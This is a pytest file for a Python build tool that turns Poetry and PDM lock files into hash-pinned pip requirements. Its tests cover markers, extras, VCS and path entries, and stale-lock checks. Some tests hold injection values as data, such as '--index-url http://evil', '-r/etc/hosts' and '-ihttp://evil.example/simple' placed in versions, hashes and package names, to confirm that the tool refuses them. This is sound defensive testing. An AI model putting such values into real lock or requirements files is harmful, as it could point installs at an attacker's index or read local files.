"""Poetry and PDM locks as the lock of a build (research UC3): each parser, the target's markers,
extras, path/VCS/URL entries, the stale-lock check, and the records a build keeps. The fixtures
are in tests/fixtures/projects/foreign (README there)."""

import shutil
from collections.abc import Mapping
from pathlib import Path

import pytest

from fsbpyr.build import lock_warnings
from fsbpyr.closure import marker_environment
from fsbpyr.foreign import ForeignLockError, export, stale
from fsbpyr.manifest import LockError, lock_record, read_lock
from fsbpyr.project import LockSource, Project
from fsbpyr.staging import StagingOptions, staging_plan

FIXTURES = Path(__file__).parents[2] / "fixtures" / "projects" / "foreign"
LINUX = marker_environment("3.14.1")
WINDOWS = {**LINUX, "sys_platform": "win32", "platform_system": "Windows", "os_name": "nt"}
MAIN = ["click", "markdown-it-py", "mdurl", "pygments", "rich"]
POETRY, PDM = LockSource.POETRY_LOCK, LockSource.PDM_LOCK
CLICK_WHEEL = "255bc9599cf7748b4b1a446ccc735421bd08a2ae529a8b88597d3de5664ee360"
CLICK_SDIST = "ba0d2089de75ea0310e2dde03160e6ca10009947fb95a182f9b54021bb272e34"


def _copy(name: str, tmp_path: Path) -> Path:
    project = tmp_path / name
    shutil.copytree(FIXTURES / name, project)
    return project


def _names(exported: str) -> list[str]:
    """The requirement of each line that starts one."""
    return [line.split()[0] for line in exported.splitlines() if line and line[0].isalpha()]


def _pins(
    name: str, source: LockSource, tmp_path: Path, environment: Mapping[str, str] = LINUX,
    extras: tuple[str, ...] = (),
) -> list[str]:  # fmt: skip
    return _names(export(source, _copy(name, tmp_path), environment=environment,
                         extras=extras).text)  # fmt: skip


# --- the groups, markers and hashes ----------------------------------------------------------


@pytest.mark.parametrize(
    ("name", "source"),
    [("poetry2", POETRY), ("poetry1", POETRY), ("poetry-legacy", POETRY), ("pdm", PDM)],
)
def test_the_main_group_is_exported_without_dev_and_windows_only_packages(
    tmp_path: Path, name: str, source: LockSource
) -> None:
    pins = _pins(name, source, tmp_path)

    expected = [f"{n}==" + v for n, v in zip(MAIN, ["8.5.0", "4.2.0", "0.1.2", "2.21.0", "15.0.0"],
                                             strict=True)]  # fmt: skip
    assert pins == expected  # no iniconfig (dev), no colorama (win32)


@pytest.mark.parametrize(
    ("name", "source"),
    [("poetry2", POETRY), ("poetry1", POETRY), ("pdm", PDM)],
)
def test_markers_are_evaluated_for_the_target(
    tmp_path: Path, name: str, source: LockSource
) -> None:
    pins = _pins(name, source, tmp_path, environment=WINDOWS)

    assert "colorama==0.4.6" in pins
    assert "iniconfig==2.3.1" not in pins


@pytest.mark.parametrize(
    ("name", "source"),
    [("poetry2", POETRY), ("poetry1", POETRY), ("pdm", PDM)],
)
def test_every_hash_of_a_package_is_listed_and_the_file_demands_them(
    tmp_path: Path, name: str, source: LockSource
) -> None:
    exported = export(source, _copy(name, tmp_path), environment=LINUX)

    assert exported.hashed
    assert exported.count == len(MAIN)
    assert (f"click==8.5.0 \\\n    --hash=sha256:{CLICK_WHEEL} \\\n"
            f"    --hash=sha256:{CLICK_SDIST}\n") in exported.text  # fmt: skip


@pytest.mark.parametrize(
    ("name", "source"),
    [("poetry2", POETRY), ("poetry1", POETRY), ("pdm", PDM)],
)
def test_an_extra_adds_its_packages(tmp_path: Path, name: str, source: LockSource) -> None:
    pins = _pins(name, source, tmp_path, extras=("fancy",))

    assert pins == ["click==8.5.0", "markdown-it-py==4.2.0", "mdurl==0.1.2", "packaging==26.3",
                    "pygments==2.21.0", "rich==15.0.0"]  # fmt: skip


@pytest.mark.parametrize(
    ("name", "source", "message"),
    [("poetry2", POETRY, "poetry.lock has no extra 'nope'"),
     ("poetry1", POETRY, "poetry.lock has no extra 'nope'"),
     ("pdm", PDM, "pdm.lock has no group for the extra 'nope'")],
)  # fmt: skip
def test_an_extra_the_lock_does_not_have_is_an_error(
    tmp_path: Path, name: str, source: LockSource, message: str
) -> None:
    with pytest.raises(ForeignLockError, match=message):
        export(source, _copy(name, tmp_path), environment=LINUX, extras=("nope",))


def test_a_lock_that_does_not_say_the_groups_is_walked_from_the_projects_dependencies(
    tmp_path: Path,
) -> None:
    """Poetry 1.5 to 1.8 locks have no group: iniconfig is in the lock and not in the build."""
    project = _copy("poetry1", tmp_path)
    assert "iniconfig" in (project / "poetry.lock").read_text()
    assert "groups" not in (project / "poetry.lock").read_text()

    exported = export(POETRY, project, environment=LINUX)

    assert "iniconfig" not in exported.text
    assert "markdown-it-py==4.2.0" in exported.text  # reached through rich


def test_a_dependency_of_the_project_with_a_python_constraint_is_evaluated(
    tmp_path: Path,
) -> None:
    project = _copy("poetry1", tmp_path)
    pyproject = project / "pyproject.toml"
    pyproject.write_text(pyproject.read_text().replace(
        'rich = ">=13"', 'rich = {version = ">=13", python = "<3.12"}'))  # fmt: skip

    assert "rich==15.0.0" not in export(POETRY, project, environment=LINUX).text

    pyproject.write_text(pyproject.read_text().replace('"<3.12"', '"^3.12"'))
    with pytest.raises(ForeignLockError, match=r"rich has the python constraint '\^3.12'"):
        export(POETRY, project, environment=LINUX)


def test_a_dependency_both_versions_of_which_apply_is_refused_naming_it(tmp_path: Path) -> None:
    project = _copy("poetry2", tmp_path)
    lock = project / "poetry.lock"
    text = lock.read_text()
    start, end = text.index('[[package]]\nname = "mdurl"'), text.index('[[package]]\nname = "pack')
    twin = text[start:end]
    older = twin.replace('version = "0.1.2"', 'version = "0.1.1"')
    lock.write_text(text.replace(twin, twin + older))

    with pytest.raises(ForeignLockError, match=r"poetry.lock: mdurl is locked at 0.1.1, 0.1.2"):
        export(POETRY, project, environment=LINUX)


def test_a_dependency_the_lock_does_not_list_means_a_stale_lock(tmp_path: Path) -> None:
    project = _copy("poetry1", tmp_path)
    pyproject = project / "pyproject.toml"
    text = pyproject.read_text()
    pyproject.write_text(text.replace('rich = ">=13"', 'rich = ">=13"\nrequests = "*"'))

    with pytest.raises(ForeignLockError, match=r"poetry.lock does not list requests"):
        export(POETRY, project, environment=LINUX)


def test_a_pep_621_dependency_that_is_no_requirement_is_refused(tmp_path: Path) -> None:
    project = _copy("poetry1", tmp_path)
    (project / "pyproject.toml").write_text(
        '[project]\nname = "p"\ndependencies = ["not a (req"]\n')

    with pytest.raises(ForeignLockError, match=r"invalid dependency 'not a .req'"):
        export(POETRY, project, environment=LINUX)


def test_pep_621_dependencies_root_a_lock_without_groups_and_their_markers_apply(
    tmp_path: Path,
) -> None:
    project = _copy("poetry1", tmp_path)
    (project / "pyproject.toml").write_text(
        '[project]\nname = "p"\n'
        'dependencies = ["click>=8", "colorama; sys_platform == \'win32\'"]\n')

    assert _names(export(POETRY, project, environment=LINUX).text) == ["click==8.5.0"]


def test_an_invalid_marker_in_the_lock_is_refused_naming_the_entry(tmp_path: Path) -> None:
    project = _copy("poetry2", tmp_path)
    lock = project / "poetry.lock"
    lock.write_text(lock.read_text().replace('sys_platform == \\"win32\\"', 'sys_platform =='))

    with pytest.raises(ForeignLockError, match=r"colorama 0.4.6: invalid marker"):
        export(POETRY, project, environment=LINUX)


@pytest.mark.parametrize("source", [POETRY, PDM])
def test_a_lock_that_is_not_toml_fails_where_it_is_read(tmp_path: Path, source: LockSource) -> None:
    (tmp_path / source.value).write_text("[[package\n")

    with pytest.raises(ForeignLockError, match=f"cannot read {source.value}"):
        export(source, tmp_path, environment=LINUX)
    with pytest.raises(LockError, match=f"cannot read {source.value}"):
        read_lock(source, "[[package\n")
    assert stale(source, tmp_path) is None  # the build fails with the lock's own message


def test_a_missing_lock_is_a_foreign_lock_error(tmp_path: Path) -> None:
    with pytest.raises(ForeignLockError, match=r"cannot read pdm.lock"):
        export(PDM, tmp_path, environment=LINUX)


# --- path, VCS and URL entries, other indexes --------------------------------------------------


def _with_entry(tmp_path: Path, source: LockSource, entry: str, dependency: str = "") -> Path:
    """A project with one dependency, ``entry`` (a ``[[package]]``), and nothing else."""
    project = tmp_path / "p"
    project.mkdir(parents=True)
    (project / "libs").mkdir()
    (project / "libs" / "w.whl").write_bytes(b"")
    if source is POETRY:
        (project / "pyproject.toml").write_text(
            '[tool.poetry]\nname = "p"\n[tool.poetry.dependencies]\npython = "^3.12"\n'
            f"{dependency}")  # fmt: skip
        (project / "poetry.lock").write_text(entry + '\n[metadata]\nlock-version = "2.0"\n')
    else:
        (project / "pyproject.toml").write_text("[project]\nname = 'p'\n")
        (project / "pdm.lock").write_text('[metadata]\ngroups = ["default"]\n\n' + entry)
    return project


def test_a_poetry_path_dependency_is_a_regular_install_of_the_directory(tmp_path: Path) -> None:
    entry = ('[[package]]\nname = "Local_Lib"\nversion = "0.1.0"\nfiles = []\n'
             '[package.source]\ntype = "directory"\nurl = "libs"\ndevelop = true\n')  # fmt: skip
    project = _with_entry(tmp_path, POETRY, entry, 'local-lib = {path = "libs", develop = true}\n')

    exported = export(POETRY, project, environment=LINUX)

    assert exported.text.splitlines()[1:] == [f"local-lib @ {(project / 'libs').as_uri()}"]
    assert not exported.hashed  # a directory has no hash: uv verifies, it does not require


def test_a_pdm_path_dependency_resolves_project_root_and_relative_paths(tmp_path: Path) -> None:
    for number, path in enumerate(("./libs", "file:///${PROJECT_ROOT}/libs")):
        entry = (f'[[package]]\nname = "local-lib"\nversion = "0.1.0"\npath = "{path}"\n'
                 'groups = ["default"]\n')  # fmt: skip
        project = _with_entry(tmp_path / str(number), PDM, entry)

        exported = export(PDM, project, environment=LINUX)

        assert exported.text.splitlines()[1:] == [f"local-lib @ {(project / 'libs').as_uri()}"]


def test_a_missing_path_is_refused_naming_the_entry(tmp_path: Path) -> None:
    entry = ('[[package]]\nname = "gone"\nversion = "1"\nfiles = []\n'
             '[package.source]\ntype = "directory"\nurl = "nowhere"\n')  # fmt: skip
    project = _with_entry(tmp_path, POETRY, entry, 'gone = {path = "nowhere"}\n')

    with pytest.raises(ForeignLockError, match=r"poetry.lock: gone 1 is the path nowhere"):
        export(POETRY, project, environment=LINUX)


def test_a_poetry_file_dependency_installs_the_file(tmp_path: Path) -> None:
    entry = ('[[package]]\nname = "wheel"\nversion = "0.1"\nfiles = []\n'
             '[package.source]\ntype = "file"\nurl = "libs/w.whl"\n')  # fmt: skip
    project = _with_entry(tmp_path, POETRY, entry, 'wheel = {path = "libs/w.whl"}\n')

    exported = export(POETRY, project, environment=LINUX)

    uri = (project / "libs" / "w.whl").as_uri()
    assert exported.text.splitlines()[1:] == [f"wheel @ {uri}"]


def test_vcs_entries_keep_their_pinned_commit(tmp_path: Path) -> None:
    sha = "a" * 40
    poetry = ('[[package]]\nname = "tool"\nversion = "1.0"\nfiles = []\n[package.source]\n'
              f'type = "git"\nurl = "https://example.org/t.git"\nreference = "v1"\n'
              f'resolved_reference = "{sha}"\nsubdirectory = "pkg"\n')  # fmt: skip
    pdm = ('[[package]]\nname = "tool"\nversion = "1.0"\ngit = "https://example.org/t.git"\n'
            f'ref = "v1"\nrevision = "{sha}"\nsubdirectory = "pkg"\ngroups = ["default"]\n')

    for source, entry, dependency in ((POETRY, poetry, 'tool = {git = "x"}\n'), (PDM, pdm, "")):
        project = _with_entry(tmp_path / source.value, source, entry, dependency)

        text = export(source, project, environment=LINUX).text

        assert text.splitlines()[1:] == [f"tool @ git+https://example.org/t.git@{sha}#subdirectory=pkg"]


def test_a_vcs_entry_without_a_commit_is_refused_naming_it(tmp_path: Path) -> None:
    entry = ('[[package]]\nname = "tool"\nversion = "1.0"\nfiles = []\n[package.source]\n'
             'type = "git"\nurl = "https://example.org/t.git"\nreference = "main"\n')  # fmt: skip
    project = _with_entry(tmp_path, POETRY, entry, 'tool = {git = "x"}\n')

    with pytest.raises(ForeignLockError, match=r"poetry.lock: tool 1.0 comes from https://exam"):
        export(POETRY, project, environment=LINUX)


def test_a_url_entry_keeps_its_hash(tmp_path: Path) -> None:
    digest = "b" * 64
    entry = ('[[package]]\nname = "pkg"\nversion = "2"\nfiles = [\n    '
             f'{{file = "pkg-2.tar.gz", hash = "sha256:{digest}"}},\n]\n[package.source]\n'
             'type = "url"\nurl = "https://example.org/dl/pkg-2.tar.gz"\n')  # fmt: skip
    project = _with_entry(tmp_path, POETRY, entry, 'pkg = {url = "x"}\n')

    exported = export(POETRY, project, environment=LINUX)

    assert exported.text.splitlines()[1:] == [f"pkg @ https://example.org/dl/pkg-2.tar.gz#sha256={digest}"]
    assert exported.hashed


def test_a_value_that_would_add_a_line_to_the_requirements_is_refused(tmp_path: Path) -> None:
    entry = ('[[package]]\nname = "tool"\nversion = "1.0\\n--index-url http://evil"\nfiles = []\n'
             '[package.source]\ntype = "git"\nurl = "https://example.org/t.git"\n')  # fmt: skip
    project = _with_entry(tmp_path, POETRY, entry, 'tool = "*"\n')

    with pytest.raises(ForeignLockError, match=r"poetry.lock: 'tool' '1.0.n--index-url http"):
        export(POETRY, project, environment=LINUX)


def test_another_package_index_is_refused_naming_the_entry(tmp_path: Path) -> None:
    entry = ('[[package]]\nname = "secret"\nversion = "3.1"\nfiles = []\n[package.source]\n'
             'type = "legacy"\nurl = "https://pypi.example.org/simple"\n'
             'reference = "corp"\n')  # fmt: skip
    project = _with_entry(tmp_path, POETRY, entry, 'secret = "*"\n')

    with pytest.raises(ForeignLockError, match=r"poetry.lock: secret 3.1 comes from the package "
                                               r"index https://pypi.example.org/simple"):
        export(POETRY, project, environment=LINUX)


def test_pdm_without_a_group_per_package_is_refused_unless_there_is_only_the_default(
    tmp_path: Path,
) -> None:
    project = _copy("pdm", tmp_path)
    lock = project / "pdm.lock"
    per_package = {'groups = ["default"]', 'groups = ["dev"]', 'groups = ["fancy"]'}
    lines = [line for line in lock.read_text().splitlines() if line not in per_package]
    lock.write_text("\n".join(lines) + "\n")

    with pytest.raises(ForeignLockError, match="groups default, dev, fancy without saying"):
        export(PDM, project, environment=LINUX)

    lock.write_text(lock.read_text().replace('groups = ["default", "dev", "fancy"]',
                                             'groups = ["default"]'))  # fmt: skip
    assert "iniconfig==2.3.1" in export(PDM, project, environment=LINUX).text


def test_pdm_lock_4_0_keeps_its_hashes_by_name_and_version(tmp_path: Path) -> None:
    project = tmp_path / "old"
    project.mkdir()
    (project / "pyproject.toml").write_text("[project]\nname = 'p'\n")
    (project / "pdm.lock").write_text(
        '[metadata]\ngroups = ["default"]\nlock_version = "4.0"\n\n[[package]]\nname = "Click"\n'
        'version = "8.5.0"\n\n[metadata.files]\n"Click 8.5.0" = [\n    '
        f'{{url = "https://x/click-8.5.0.tar.gz", hash = "sha256:{CLICK_SDIST}"}},\n]\n')

    exported = export(PDM, project, environment=LINUX)

    assert exported.text.splitlines()[1:] == ["click==8.5.0 \\", f"    --hash=sha256:{CLICK_SDIST}"]


# --- a lock that does not match the project ---------------------------------------------------

# Poetry's own content-hash of a real pyproject.toml, from a lock written by Poetry 1.8.5
REAL_PYPROJECT = """\
[tool.poetry]
name = "tavily-search"
version = "1.0"
description = "A tool for performing searches using Tavily"
authors = ["Kyle Webb <webbjkyle@gmail.com>"]
readme = "README.md"
package-mode = false

[tool.poetry.dependencies]
python = ">=3.12,<4"
atomic-agents = {path = "../../../", develop = true}
pydantic = ">=2.8.2,<3"
aiohttp = ">=3.9.0,<4"

[tool.poetry.group.dev.dependencies]
coverage = ">=7.6.1,<8.0.0"
pytest = ">=8.3.3,<9.0.0"
pytest-asyncio = ">=0.23.5,<1.0.0"
pytest-cov = ">=5.0.0,<6.0.0"
python-dotenv = ">=1.0.0,<2.0.0"
rich = ">=13.7.0,<14.0.0"

[build-system]
requires = ["poetry-core"]
build-backend = "poetry.core.masonry.api"
"""
REAL_HASH = "bc0b3eeab4a1c07bb3ee9c3dbf005ed2fca7cbf4c70b61dac05cd9463c4e66ce"


def test_the_content_hash_is_poetrys_own(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text(REAL_PYPROJECT)
    (tmp_path / "poetry.lock").write_text(f'[metadata]\ncontent-hash = "{REAL_HASH}"\n')

    assert stale(POETRY, tmp_path) is None

    (tmp_path / "poetry.lock").write_text(f'[metadata]\ncontent-hash = "{"0" * 64}"\n')
    assert "poetry.lock is out of date" in (stale(POETRY, tmp_path) or "")


@pytest.mark.parametrize(
    ("name", "source", "before", "after"),
    [("poetry2", POETRY, '"click>=8.1"', '"click>=8.2"'),
     ("poetry1", POETRY, 'click = ">=8.1"', 'click = ">=8.2"'),
     ("pdm", PDM, '"click>=8.1"', '"click>=8.2"')],
)  # fmt: skip
def test_a_lock_made_before_the_dependencies_changed_is_stale(
    tmp_path: Path, name: str, source: LockSource, before: str, after: str
) -> None:
    project = _copy(name, tmp_path)
    assert stale(source, project) is None
    pyproject = project / "pyproject.toml"
    pyproject.write_text(pyproject.read_text().replace(before, after))

    message = stale(source, project)

    assert message is not None
    assert message.startswith(f"{source.value} is out of date")
    assert lock_warnings(Project.load(project), source, None) == [message]


def test_other_changes_of_the_pyproject_leave_the_lock_current(tmp_path: Path) -> None:
    project = _copy("poetry2", tmp_path)
    pyproject = project / "pyproject.toml"
    pyproject.write_text(pyproject.read_text().replace("0.1.0", "0.2.0"))

    assert stale(POETRY, project) is None


# --- the records of the build ----------------------------------------------------------------


@pytest.mark.parametrize(
    ("name", "source"), [("poetry2", POETRY), ("poetry-legacy", POETRY), ("pdm", PDM)]
)
def test_the_lock_record_and_its_packages(tmp_path: Path, name: str, source: LockSource) -> None:
    project = _copy(name, tmp_path)

    record, packages = lock_record(project, source, project / source.value)

    assert record["kind"] == source.value
    assert record["path"] == source.value
    assert record["hashed"] is True
    click = packages["click"][0]
    assert click.kind == "registry"
    assert click.wheels == {"click-8.5.0-py3-none-any.whl": CLICK_WHEEL}
    assert click.sdist == CLICK_SDIST
    assert packages["markdown-it-py"][0].wheels  # a name with a dash is canonical, not the file's


def test_the_lock_kinds_of_other_sources_are_unchanged(tmp_path: Path) -> None:
    assert read_lock(LockSource.REQUIREMENTS, "click==8\n") == {}


# --- the project ---------------------------------------------------------------------------


def test_a_foreign_lock_ranks_after_requirements_and_the_uv_locks(tmp_path: Path) -> None:
    project = _copy("poetry2", tmp_path)
    assert Project.load(project).lock_source() is POETRY

    (project / "requirements.txt").write_text("click==8.5.0\n")
    assert Project.load(project).lock_source() is LockSource.REQUIREMENTS

    (project / "requirements.txt").unlink()
    (project / "pdm.lock").write_text("")
    assert Project.load(project).lock_source() is POETRY  # Poetry's, when both are there

    (project / "uv.lock").write_text("")
    assert Project.load(project).lock_source() is LockSource.UV_LOCK


def test_the_pdm_lock_is_the_lock_without_a_poetry_one(tmp_path: Path) -> None:
    project = Project.load(_copy("pdm", tmp_path))

    assert project.lock_source() is PDM
    assert project.lock_path(PDM) == project.directory / "pdm.lock"


# --- staging ---------------------------------------------------------------------------------


def test_the_plan_installs_the_converted_file_that_lives_in_the_work_directory(
    tmp_path: Path,
) -> None:
    project = Project.load(_copy("poetry2", tmp_path))
    before = sorted(path.name for path in project.directory.iterdir())
    work = tmp_path / "work"
    work.mkdir()

    plan = staging_plan(project, POETRY, Path("/u/uv"), work,
                        StagingOptions("3.14", environment=LINUX, offline=True))  # fmt: skip

    requirements = work / "poetry.lock.requirements.txt"
    base = ["/u/uv", "pip", "install", "--python", str(work / "stage" / "bin" / "python"),
            "--offline", "--quiet"]  # fmt: skip
    assert plan.install[1] == [*base, "--require-hashes", "--no-editable", "-r", str(requirements)]
    assert requirements.read_text().startswith("# poetry.lock as fsbpyr reads it")
    assert sorted(path.name for path in project.directory.iterdir()) == before


def test_a_path_entry_leaves_hash_checking_to_the_hashes_that_are_there(tmp_path: Path) -> None:
    entry = ('[[package]]\nname = "local-lib"\nversion = "0.1.0"\nfiles = []\n'
             '[package.source]\ntype = "directory"\nurl = "libs"\n')  # fmt: skip
    project = Project.load(_with_entry(tmp_path, POETRY, entry, 'local-lib = {path = "libs"}\n'))
    work = tmp_path / "work"
    work.mkdir()

    plan = staging_plan(project, POETRY, Path("/u/uv"), work,
                        StagingOptions("3.14", environment=LINUX))  # fmt: skip

    assert "--require-hashes" not in plan.install[1]
    assert "--no-editable" in plan.install[1]


@pytest.mark.parametrize("digest", [
    "abc", "aa --extra-index-url=http://evil.example/simple\n-r/etc/hosts",
    "a" * 63 + "\n--index-url=http://evil.example/",
])
def test_a_hash_that_is_not_a_digest_cannot_add_options_to_the_file(
    tmp_path: Path, digest: str,
) -> None:  # fmt: skip
    entry = ('[[package]]\nname = "six"\nversion = "1.16.0"\n[[package.files]]\nfile = "six.whl"\n'
             f'hash = "sha256:{digest}"\n'.replace("\n--", "\\n--").replace("\n-r", "\\n-r"))
    project = _with_entry(tmp_path, POETRY, entry, 'six = "*"\n')

    with pytest.raises(ForeignLockError, match="not 64 hex digits"):
        export(POETRY, project, environment=LINUX)


@pytest.mark.parametrize("name", ["-ihttp://evil.example/simple", "-r/etc/hosts", "a=b"])
def test_a_package_name_that_is_no_name_cannot_become_an_option(
    tmp_path: Path, name: str,
) -> None:  # fmt: skip
    entry = f'[[package]]\nname = "{name}"\nversion = "1.0"\nfiles = []\n'
    project = _with_entry(tmp_path, POETRY, entry, f'"{name}" = "*"\n')

    with pytest.raises(ForeignLockError):
        export(POETRY, project, environment=LINUX)
